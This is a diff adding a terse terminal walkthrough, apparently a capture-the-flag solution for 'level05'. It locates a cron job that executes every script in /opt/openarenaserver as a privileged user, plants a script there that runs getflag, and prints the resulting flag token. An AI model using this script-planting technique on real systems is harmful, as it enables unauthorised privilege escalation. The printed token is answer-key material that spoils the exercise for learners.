@@ -1,0 +1,26 @@
+> find / -name "*mail*"
+...
+...
+/var/mail
+
+> ls
+level05
+
+> cat level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+> cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+> cd /opt/openarenaserver/
+
+> vim test.sh
+echo $(getflag) > /tmp/out05
+
+> cat /tmp/out05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
